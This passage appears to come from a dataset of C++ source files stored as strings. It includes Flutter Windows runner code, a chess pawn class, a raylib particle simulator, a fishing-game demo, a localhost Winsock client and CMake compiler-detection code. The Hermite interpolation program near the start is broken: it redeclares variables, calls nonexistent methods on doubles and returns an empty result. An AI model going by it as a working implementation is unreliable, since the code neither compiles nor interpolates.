(converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <vector>\n#include <cmath>\n#include <functional>\n\nstd::vector<double> Hermite(std::vector<double> x, std::vector<double> y, std::vector<double> der1, std::vector<double> der2, std::vector<int> der1_coord, std::vector<int> der2_coord) {\n    int n = x.size() + der1.size() + der2.size();\n    std::vector<double> a(n);\n    std::vector<double> H;\n    std::vector<double> derH;\n    std::vector<double> der2H;\n    double x0;\n    double h = a[0];\n    for (int i = 1; i < n; i++) {\n        h += a[i] * pow(x0, i);\n    }\n    std::function<double(double)> H = [&](double x0) { return h; };\n    std::function<double(double)> dH = [&](double x0) { return h.diff(x0); };\n    std::function<double(double)> d2H = [&](double x0) { return dH.diff(x0); };\n    std::vector<double> eq;\n    return eq;\n}\n\nint main() {\n    std::vector<double> x;\n    std::vector<double> y;\n    std::vector<double> der1;\n    std::vector<double> der2;\n    int N;\n    std::cin >> N;\n    for (int i = 0; i < N; i++) {\n        double x0;\n        std::cin >> x0;\n        x.push_back(x0);\n    }\n    for (int i = 0; i < N; i++) {\n        double y0;\n        std::cin >> y0;\n        y.push_back(y0);\n    }\n    std::vector<int> der1_coord;\n    std::vector<int> der2_coord;\n    int N1;\n    std::cin >> N1;\n    for (int i = 0; i < N1; i++) {\n        int point;\n        std::cin >> point;\n        double der;\n        std::cin >> der;\n        der1_coord.push_back(point - 1);\n        der1.push_back(der);\n    }\n    int N2;\n    std::cin >> N2;\n    for (int i = 0; i < N2; i++) {\n        int point;\n        std::cin >> point;\n        double der;\n        std::cin >> der;\n        der2_coord.push_back(point - 1);\n        der2.push_back(der);\n    }\n    std::vector<double> result = Hermite(x, y, der1, der2, der1_coord, der2_coord);\n    for (int i = 0; i < result.size(); i++) {\n        std::cout << result[i] << std::endl;\n    }\n    return 0;\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"fastfood6\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"Pawn.h\"\nPawn::Pawn() {}\nPawn::Pawn(Color _clr) : isFirst{true}\n{\n\tif (_clr == Black)\n\t\tsym = 'p';\n\telse\n\t\tsym = 'P';\n\tclr = _clr;\n}\nchar Pawn::getSym() { return sym; }\nbool Pawn::isLegalMove(int sr, int sc, int dr, int dc, Piece* _bs[][cols])\n{\n\tif (sym == 'p')\n\t{\n\t\tif (isFirst && isVertical(sc, dc) && dr - sr == 2 && _bs[dr][dc]->getSym() == '-')\n\t\t\treturn true;\n\t\telse if (isVertical(sc, dc) && dr - sr == 1 && _bs[dr][dc]->getSym() == '-')\n\t\t\treturn true;\n\t\telse if (isDiagonal(sr, sc, dr, dc) && dr - sr <= 1 && _bs[dr][dc]->getColor() == 0&&_bs[dr][dc]->getSym()!='-'&&sr<dr)\n\t\t\treturn true;\n\t\t\n\t}\n\telse\n\t{\n\t\tif (isFirst && isVertical(sc, dc) && sr - dr == 2 && _bs[dr][dc]->getSym() == '-')\n\t\t\treturn true;\n\t\telse if (isVertical(sc, dc) && sr - dr == 1 && _bs[dr][dc]->getSym() == '-')\n\t\t\treturn true;\n\t\telse if (isDiagonal(sr, sc, dr, dc) && sr - dr <= 1 && _bs[dr][dc]->getColor() == 1 && _bs[dr][dc]->getSym() != '-' &&dr<sr)\n\t\t\treturn true;\n\t}\n\treturn false;\n}\nvoid Pawn::setIsFirst(bool val) { isFirst = val; }\nbool Pawn::getIsFirst() { return isFirst; }",
    "#include <raylib.h>\r\n#include <iostream>\r\n#include \"particle.h\"\r\n#include <algorithm>\r\n\r\nvoid drawAllParticles(std::vector<VerletParticle*>& Group)\r\n{\r\n\tfor (VerletParticle* Particle : Group)\r\n\t{\r\n\t\tDrawCircle(Particle->getX() * 20.0f, Particle->getY() * 20.0f, Particle->getRadius() * 20.0f,\r\n\t\t\t\r\n\t\t\t//the colour values.\r\n\r\n\t\t\tColor{\r\n\t\t\t/* Red */  (unsigned char)(Particle->getY() * 5.0f) ,\r\n\t\t\t/* Green */(unsigned char)(Particle->getID() * 2.0f + 100.0f),\r\n\t\t\t/* Blue */ (unsigned char)(Particle->getX() * 3.0f),\r\n\t\t\t/* Alpha */(unsigned char)(Particle->getY() + (Particle->GetPosition() - Particle->GetOldPosition()).ToFloat() * 255.0f)});\r\n\t}\r\n}\r\nvoid updateAllPhyisics(std::vector<VerletParticle*>& Group, float& Time, Grid& TheGrid)\r\n{\r\n\tfor (VerletParticle* Particle : Group)\r\n\t{\r\n\t\tParticle->UpdatePosition(Time);\r\n\t\t//Particle->Print();\r\n\t}\r\n\r\n\tfor (VerletParticle* Particle : Group)\r\n\t{\r\n\t\tParticle->SolveGroundCollision();\r\n\t}\r\n\r\n\t//TheGrid.SolveCollisionWithGrid(Group);\r\n\t\r\n\tfor (size_t i = 0; i <\r\n\t\t//Group.size() / 150 + 1;\r\n\t\t1;\r\n\t\ti++)\r\n\t{\r\n\t\tfor (VerletParticle* Particle1 : Group)\r\n\t\t{\r\n\t\t\tfor (VerletParticle* Particle2 : Group)\r\n\t\t\t{\r\n\t\t\t\tif (Particle1->getID() != Particle2->getID())\r\n\t\t\t\t\tVerletParticle::SolveCollision(*Particle1, *Particle2);\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\t\r\n}\r\nvoid SpawnParticle(std::vector<VerletParticle*>& particles)\r\n{\r\n\tstatic int ParticleCount = 1;\r\n\tif (\r\n\t\t//GetFrameTime() < 1.0/10)\r\n\t\tParticleCount <= 500 )\r\n\t{\r\n\t\tVerletParticle* NewOne = new VerletParticle{ ParticleCount };\r\n\t\tParticleCount++;\r\n\t\tparticles.push_back(NewOne);\r\n\t//std::cout << ParticleCount << std::endl;\r\n\t}\r\n}\r\n\r\nint main()\r\n{\r\n\tint* ScreenWidth = new int{ GetScreenWidth() }, * ScreenHight = new int{ GetScreenHeight() };\r\n\r\n\tInitWindow(1600, 900,\r\n\t\t//*ScreenWidth, *ScreenHight,\r\n\t\t\"Physics Simulator\");\r\n\tSetTargetFPS(GetMonitorRefreshRate(GetCurrentMonitor()));\r\n\t//std::cout <<  << std::endl;\r\n\r\n\tstd::vector<VerletParticle*> Particles;\r\n\t//int ParticleCount = 0;\r\n\t \r\n\tGrid TheGrid;\r\n\t{\r\n\tint* hi1 = new int[5] { 1, 4, 5, 1, 2 };\r\n\tint* hi2 = new int[5] { 1, 2, 3, 4, 5 };\r\n\r\n\tint* hello = Helper::MergeSort::Merge(hi1, 5, hi2, 5);\r\n\r\n\tfor (size_t i = 0; i < 5; i++)\r\n\t{\r\n\t\tstd::cout << hi1[i] << \" \";\r\n\t}\r\n\tstd::cout << std::endl;\r\n\tfor (size_t i = 0; i < 5; i++)\r\n\t{\r\n\t\tstd::cout << hi2[i] << \" \";\r\n\t}\r\n\tstd::cout << std::endl;\r\n\tfor (size_t i = 0; i < 10; i++)\r\n\t{\r\n\t\tstd::cout << hello[i] << \" \";\r\n\t}\r\n\tstd::cout << std::endl;\r\n}\r\n\t\r\n\twhile (!WindowShouldClose())\r\n\t{\r\n\t\t//std::cout << \"drawing started\" << std::endl;\r\n\t\tfloat DeltaTime = 0.01f;\r\n\r\n\t\tSpawnParticle(Particles);\r\n\t\tupdateAllPhyisics(Particles, DeltaTime, TheGrid);\r\n\t\t//DrawTheGrid(TheGrid);\r\n\r\n\t\t//Redering.\r\n\t\tBeginDrawing();\r\n\t\tClearBackground(Color{ 10,10,20 });\r\n\r\n\t\tdrawAllParticles(Particles);\r\n\t\tDrawFPS(10, 10);\r\n\r\n\t\tEndDrawing();\r\n\t\t//std::cout << \"drawing ended\" << std::endl;\r\n\t}\r\n\r\n\r\n\tCloseWindow();\r\n\treturn 0;\r\n}",
    "#include <iostream>\n#include <ctime>\n\nusing namespace std;\n\nclass Item\n{\npublic:\n    virtual ~Item() {}  // \u0414\u043e\u0431\u0430\u0432\u043b\u0435\u043d \u0432\u0438\u0440\u0442\u0443\u0430\u043b\u044c\u043d\u044b\u0439 \u0434\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u0434\u043b\u044f \u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0433\u043e \u0443\u0434\u0430\u043b\u0435\u043d\u0438\u044f \u043e\u0431\u044a\u0435\u043a\u0442\u043e\u0432\n    virtual void display() = 0;\n};\n\nclass Fish: public Item\n{\npublic:\n    Fish()\n    {\n        cout << \"Fish constructor called.\" << std::endl;\n    }\n\n    ~Fish()\n    {\n        cout << \"Fish destructor called.\" << std::endl;\n    }\n\n    void display() override {\n        cout << \"Fish\" << std::endl;\n    }\n\n};\n\nclass Boot: public Item\n{\npublic:\n    Boot()\n    {\n        cout << \"Boot constructor called.\" << std::endl;\n    }\n\n    ~Boot()\n    {\n        cout << \"Boot destructor called.\" << std::endl;\n    }\n\n    void display() override {\n        cout << \"Boot\" << std::endl;\n    }\n};\n\n\ntemplate<typename T>\nclass Field\n{\nprivate:\n    static const int SIZE = 9;\n    T *field[SIZE]; // \u041c\u0430\u0441\u0441\u0438\u0432 \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u0435\u0439 \u043d\u0430 Fish, Boot\npublic:\n    Field()\n    {\n        // \u0418\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u043c\u0430\u0441\u0441\u0438\u0432\u0430 \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u0435\u0439 \u043d\u0443\u043b\u0435\u0432\u044b\u043c\u0438 \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044f\u043c\u0438\n        for(int i = 0; i < SIZE; ++i)\n        {\n            field[i] = nullptr;\n        }\n    }\n\n    // \u0414\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u0434\u043b\u044f \u043e\u0441\u0432\u043e\u0431\u043e\u0436\u0434\u0435\u043d\u0438\u044f \u043f\u0430\u043c\u044f\u0442\u0438 \u0438\u0437 \u043a\u0443\u0447\u0438\n    ~Field()\n    {\n        for(int i = 0; i < SIZE; ++i)\n        {\n            delete field[i]; // \u0423\u0434\u0430\u043b\u0435\u043d\u0438\u0435 \u043e\u0431\u044a\u0435\u043a\u0442\u043e\u0432 Fish \u0438\u0437 \u043a\u0443\u0447\u0438\n        }\n    }\n\n    void addFish()\n    {\n        // \u0413\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u043e\u0433\u043e \u0438\u043d\u0434\u0435\u043a\u0441\u0430\n        int randomIndex = std::rand() % SIZE;\n        // \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u043d\u043e\u0432\u043e\u0433\u043e \u043e\u0431\u044a\u0435\u043a\u0442\u0430 Fish \u0432 \u043a\u0443\u0447\u0435 \u0438 \u043f\u0440\u0438\u0441\u0432\u043e\u0435\u043d\u0438\u0435 \u0435\u0433\u043e \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044f \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0443 \u043c\u0430\u0441\u0441\u0438\u0432\u0430 field\n        field[randomIndex] = new Fish();\n    }\n\n    void addBoot()\n    {\n        // \u0413\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u043e\u0433\u043e \u0438\u043d\u0434\u0435\u043a\u0441\u0430\n        int randomIndex = std::rand() % SIZE;\n        // \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u043d\u043e\u0432\u043e\u0433\u043e \u043e\u0431\u044a\u0435\u043a\u0442\u0430 Fish \u0432 \u043a\u0443\u0447\u0435 \u0438 \u043f\u0440\u0438\u0441\u0432\u043e\u0435\u043d\u0438\u0435 \u0435\u0433\u043e \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044f \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0443 \u043c\u0430\u0441\u0441\u0438\u0432\u0430 field\n        field[randomIndex] = new Boot();\n    }\n};\n\nvoid cast()\n{\n\n}\n\nint main()\n{\n    // \u0418\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0433\u0435\u043d\u0435\u0440\u0430\u0442\u043e\u0440\u0430 \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u044b\u0445 \u0447\u0438\u0441\u0435\u043b\n    std::srand(static_cast<unsigned int>(std::time(nullptr)));\n\n    Field<Item> field;\n    field.addFish(); // \u0414\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u0440\u044b\u0431\u044b \u043d\u0430 \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u0443\u044e \u043f\u043e\u0437\u0438\u0446\u0438\u044e \u0432 \u043f\u043e\u043b\u0435\n    field.addBoot(); // \u0414\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u0441\u0430\u043f\u043e\u0433\u0430 \u043d\u0430 \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u0443\u044e \u043f\u043e\u0437\u0438\u0446\u0438\u044e \u0432 \u043f\u043e\u043b\u0435\n\n    // \u0412\u044b\u0432\u043e\u0434 \u0442\u0438\u043f\u043e\u0432 \u043e\u0431\u044a\u0435\u043a\u0442\u043e\u0432 \u0438\u0437 \u043a\u043e\u043b\u043b\u0435\u043a\u0446\u0438\u0438\n    //int size = sizeof(field) / sizeof(field[0]);\n    for (int i = 0; i < 9; ++i)\n    {\n        field[i]->display();\n    }\n    return 0;\n}",
    "\ufeff#include <iostream>\n#include <string>\n#include <winsock2.h>\n#include <ws2tcpip.h>\n#include \"resource.h\"\n#include <tchar.h>\n#include <CommCtrl.h>\n#pragma comment(lib, \"Ws2_32.lib\")\n\n\nSOCKET _socket;\n\nBOOL CALLBACK DialogProc(HWND hwndDlg, UINT message, WPARAM wParam, LPARAM lParam) {\n    switch (message) {\n    case WM_INITDIALOG:\n        return TRUE;\n    case WM_COMMAND:\n        switch (LOWORD(wParam)) {\n        case IDC_BUTTON1: {\n            const int MAXSTRLEN = 255;\n            char buf[MAXSTRLEN];\n            char str[MAXSTRLEN];\n\n            // get text from idc_edit1\n            GetDlgItemText(hwndDlg, IDC_EDIT1, str, MAXSTRLEN);\n\n            // server connect\n            WSADATA wsaData;\n            if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {\n                MessageBox(NULL, \"WSAStartup failed\", \"Error\", MB_OK | MB_ICONERROR);\n                return TRUE;\n            }\n\n            _socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n            if (_socket == INVALID_SOCKET) {\n                MessageBox(NULL, \"Socket creation failed\", \"Error\", MB_OK | MB_ICONERROR);\n                WSACleanup();\n                return TRUE;\n            }\n\n            sockaddr_in addr;\n            addr.sin_family = AF_INET;\n            inet_pton(AF_INET, \"127.0.0.1\", &addr.sin_addr);\n            addr.sin_port = htons(20000);\n\n            if (connect(_socket, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {\n                MessageBox(NULL, \"Connection failed\", \"Error\", MB_OK | MB_ICONERROR);\n                closesocket(_socket);\n                WSACleanup();\n                return TRUE;\n            }\n\n            // send msg to server\n            send(_socket, str, strlen(str), 0);\n\n            // get server answer\n            int i = recv(_socket, buf, MAXSTRLEN, 0);\n            buf[i] = '\\0';\n\n            MessageBox(NULL, buf, \"Message from Server\", MB_OK | MB_ICONINFORMATION);\n\n            // close socket and clean winsock\n            closesocket(_socket);\n            WSACleanup();\n\n            return TRUE;\n        }\n        }\n        break;\n    case WM_CLOSE:\n        EndDialog(hwndDlg, 0);\n        break;\n    }\n    return FALSE;\n}\n\nint WINAPI _tWinMain(HINSTANCE hInst, HINSTANCE hPrev, LPTSTR lpszCmdLine, int nCmdShow) {\n    return DialogBox(hInst, MAKEINTRESOURCE(IDD_DIALOG1), NULL, (DLGPROC)DialogProc);\n}\n",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* 